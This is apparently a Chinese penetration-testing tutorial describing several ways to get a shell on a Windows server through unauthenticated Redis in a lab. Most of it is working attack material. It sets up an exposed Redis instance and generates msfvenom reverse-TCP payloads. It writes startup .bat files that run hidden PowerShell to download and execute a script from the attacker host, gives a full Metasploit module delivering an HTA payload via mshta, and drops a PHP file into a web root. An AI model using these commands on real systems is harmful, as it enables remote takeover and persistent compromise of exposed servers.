@@ -1,0 +1,95 @@
+<div class="title-image"><img src="https://pic1.zhimg.com/v2-650ce066a43c3fdedd0bcaff2bd3e5ff_b.jpg" alt=""></div><h2>Redis</h2><p>Redis 是一个开源的高性能键值数据库。最热门的 NoSql 数据库之一，也被人们称为数据结构服务器。</p><p>它最突出的特点就是：<b>快</b></p><ul><li>以内存作为数据存储介质，读写数据的效率极高。</li><li>跟 memcache 不同的是，储存在 Redis 中的数据是持久化的，断电或重启，数据也不会丢失。</li><li>存储分为内存存储、磁盘存储和 log 文件。</li><li>可以从磁盘重新将数据加载到内存中，也可以通过配置文件对其进行配置，因此，redis 才能实现持久化。</li><li>支持主从模式，可以配置集群，更利于支撑大型的项目。</li></ul><h2>搭建环境</h2><p>靶机 Windows Server 2012 </p><p>攻击机：kali linux</p><p>Redis 下载：<a href="https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/microsoftarc</span><span class="invisible">hive/redis</span><span class="ellipsis"></span></a> （这里用的是 <a href="https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi" class=" wrap external" target="_blank" rel="nofollow noreferrer">3.2.100 版本</a>）</p><p>安装完 Redis 后会自动启动，先停止 Redis 服务</p><div class="highlight"><pre><code class="language-text">redis-server --service-stop</code></pre></div><p><b>更改配置文件</b></p><p>进入 Redis 的安装目录，然后修改 windows.conf 文件</p><p>注释掉# bind 127.0.0.1</p><p>把 protected-mode yes 改成 protected-mode no</p><p>这样就可以模拟未授权访问的 Redis 靶机。</p><p><b>端口设置</b></p><p>Redis 默认端口是 6379，所以需要在 windows 的防火墙里开放 6379 端口，或者靶机直接就关闭防火墙。</p><p><b>测试未授权访问</b></p><div class="highlight"><pre><code class="language-text">./redis-cli -h xxx.xxx.xxx.xxx</code></pre></div><p><b>配置 Windows server 2012</b></p><p>默认是无法在启动项文件夹写文件的，需要把 C:\Users\Administrator 文件夹的组添加上 Everyone 并把权限改成完全控制。</p><div class="highlight"><pre><code class="language-text">config set dir &#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&#34;
+OK</code></pre></div><p><b>相关命令：</b></p><p>卸载 Redis 服务</p><div class="highlight"><pre><code class="language-text">redis-server --service-uninstall</code></pre></div><p>安装 Redis 服务</p><div class="highlight"><pre><code class="language-text">redis-server --service-install redis.windows.conf</code></pre></div><p>启动 Redis 服务</p><div class="highlight"><pre><code class="language-text">redis-server --service-start </code></pre></div><p><b>下面介绍今天的主题，几种 Redis Getshell 的方法</b></p><h2><b>几种 </b>Redis<b> Getshell 方法</b></h2><p><b>001——利用 powershell 反弹 shell</b></p><p>先用 msfvenom 生成 shell.ps1 文件</p><div class="highlight"><pre><code class="language-text">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -f psh-reflection &gt;shell.ps1</code></pre></div><p>然后把 shell.ps1 文件复制到 /var/www/html 目录下，然后启动 apache2</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg" data-caption="" data-size="normal" data-rawwidth="1269" data-rawheight="208" class="origin_image zh-lightbox-thumb" width="1269" data-original="https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg" data-caption="" data-size="normal" data-rawwidth="1269" data-rawheight="208" class="origin_image zh-lightbox-thumb lazy" width="1269" data-original="https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg"/></figure><p>用 msf 进行监听，设置 payload 的时候注意区分 32 位和 64 位操作系统</p><div class="highlight"><pre><code class="language-text">msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp</code></pre></div><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg" data-caption="" data-size="normal" data-rawwidth="890" data-rawheight="228" class="origin_image zh-lightbox-thumb" width="890" data-original="https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg" data-caption="" data-size="normal" data-rawwidth="890" data-rawheight="228" class="origin_image zh-lightbox-thumb lazy" width="890" data-original="https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg"/></figure><p>利用 Redis 写入 bat 文件到启动项</p><p>注意  \r\n\r\n 代表换行的意思，因为用 redis 写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠用来转义 payload 中的双引号。</p><div class="highlight"><pre><code class="language-text">xxx.xxx.xxx.1:6379&gt; config set dir &#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&#34;
+OK
+xxx.xxx.xxx.1:6379&gt; config set dbfilename shell.bat
+OK
+xxx.xxx.xxx.1:6379&gt; set x &#34;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://xxx.xxx.xxx.2/shell.ps1&#39;);xx.ps1\&#34;\r\n\r\n&#34;
+OK
+xxx.xxx.xxx.1:6379&gt; save
+OK</code></pre></div><p>重启后得到 shell</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg" data-caption="" data-size="normal" data-rawwidth="1232" data-rawheight="340" class="origin_image zh-lightbox-thumb" width="1232" data-original="https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg" data-caption="" data-size="normal" data-rawwidth="1232" data-rawheight="340" class="origin_image zh-lightbox-thumb lazy" width="1232" data-original="https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg"/></figure><p><b>002——使用 mshta.exe</b></p><p>到 /usr/share/metasploit-framework/modules/exploits/windows 目录下创建一个 msh_shell.rb 文件，复制以下内容。</p><div class="highlight"><pre><code class="language-text">##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+  
+  
+class MetasploitModule  &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+  
+  include Msf::Exploit::Remote::HttpServer
+  
+  def initialize(info  = {})
+    super(update_info(info,
+      &#39;Name&#39; =&gt; &#39;Microsoft Office Payload Delivery&#39;,
+      &#39;Description&#39; =&gt; %q{
+        This module generates an command to place within
+        a word document, that when executed, will retrieve a HTA payload
+        via HTTP from an web server. Currently have not figured out how
+        to generate a doc.
+      },
+      &#39;License&#39; =&gt; MSF_LICENSE,
+      &#39;Arch&#39; =&gt; ARCH_X86,
+      &#39;Platform&#39; =&gt; &#39;win&#39;,
+      &#39;Targets&#39; =&gt;
+        [
+          [&#39;Automatic&#39;, {} ],
+        ],
+      &#39;DefaultTarget&#39; =&gt; 0,
+    ))
+  end
+  
+  def on_request_uri(cli, _request)
+    print_status(&#34;Delivering payload&#34;)
+    p = regenerate_payload(cli)
+    data = Msf::Util::EXE.to_executable_fmt(
+      framework,
+      ARCH_X86,
+      &#39;win&#39;,
+      p.encoded,
+      &#39;hta-psh&#39;,
+      { :arch =&gt; ARCH_X86, :platform =&gt; &#39;win &#39;}
+    )
+    send_response(cli, data, &#39;Content-Type&#39; =&gt; &#39;application/hta&#39;)
+  end
+  
+  
+  def primer
+    url = get_uri
+    print_status(&#34;Place the following DDE in an MS document:&#34;)
+    print_line(&#34;mshta.exe \&#34;#{url}\&#34;&#34;)
+  end
+end
+</code></pre></div><p>然后在 msf 里重新加载所有模块：reload_all</p><p>再找到这个模块就可以使用了</p><div class="highlight"><pre><code class="language-text">msf5 exploit(windows/msh_shell) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(windows/msh_shell) &gt; set lhost xxx.xxx.xxx.xxx
+lhost =&gt; xxx.xxx.xxx.xxx
+msf5 exploit(windows/msh_shell) &gt; set uripath shell
+uripath =&gt; shell
+msf5 exploit(windows/msh_shell) &gt; exploit 
+zlib(finalizer): the stream was freed prematurely.
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:4444 
+[*] Using URL: http://0.0.0.0:8080/shell
+[*] Local IP: http://xxx.xxx.xxx.xxx:8080/shell
+[*] Server started.
+[*] Place the following DDE in an MS document:
+mshta.exe &#34;http://xxx.xxx.xxx.xxx:8080/shell&#34;</code></pre></div><p>然后利用 Redis 写入 bat 文件到启动项</p><div class="highlight"><pre><code class="language-text">[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
+xxx.xxx.xxx.xxx:6379&gt; config set dir &#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&#34;
+OK
+xxx.xxx.xxx.xxx:6379&gt; config set dbfilename shell.bat
+OK
+xxx.xxx.xxx.xxx:6379&gt; set x &#34;\r\n\r\nmshta http://xxx.xxx.xxx.xxx:8080/shell\r\n\r\n&#34;
+OK
+xxx.xxx.xxx.xxx:6379&gt; save
+OK</code></pre></div><p>重启靶机就可以拿到 session</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg" data-caption="" data-size="normal" data-rawwidth="1231" data-rawheight="340" class="origin_image zh-lightbox-thumb" width="1231" data-original="https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg" data-caption="" data-size="normal" data-rawwidth="1231" data-rawheight="340" class="origin_image zh-lightbox-thumb lazy" width="1231" data-original="https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-1981ccbfc054613a5de5c5475ea3ee3a_b.jpg"/></figure><p><b>003——使用Cobalt Strike</b></p><blockquote>把 Cobalt Strike 的服务端脚本放到 kali 上运行，然后客户端在本机运行。</blockquote><p><a href="https://link.zhihu.com/?target=https%3A//github.com/aleenzz/Cobalt_Strike_wiki" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/aleenzz/Coba</span><span class="invisible">lt_Strike_wiki</span><span class="ellipsis"></span></a> </p><p>这里就不搭环境操作了。。。</p><p><b>004——利用web服务</b></p><p>如果目标有 Web 业务的话，可以结合 web 业务进行 Getshell。</p><div class="highlight"><pre><code class="language-text">[root@localhost src]# ./redis-cli -h xxx.xxx.xxx.xxx
+xxx.xxx.xxx.xxx:6379&gt; config set dir &#34;C:/phpstudy/WWW&#34;
+OK
+xxx.xxx.xxx.xxx:6379&gt; config set dbfilename phpinfo.php
+OK
+xxx.xxx.xxx.xxx:6379&gt; set x &#34;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&#34;
+OK
+xxx.xxx.xxx.xxx:6379&gt; save
+OK</code></pre></div><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg" data-caption="" data-size="normal" data-rawwidth="1954" data-rawheight="677" class="origin_image zh-lightbox-thumb" width="1954" data-original="https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg" data-caption="" data-size="normal" data-rawwidth="1954" data-rawheight="677" class="origin_image zh-lightbox-thumb lazy" width="1954" data-original="https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-083f24e463152cf2094ec07e771f07f6_b.jpg"/></figure><p>更多有关渗透测试的内容请前往<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure>
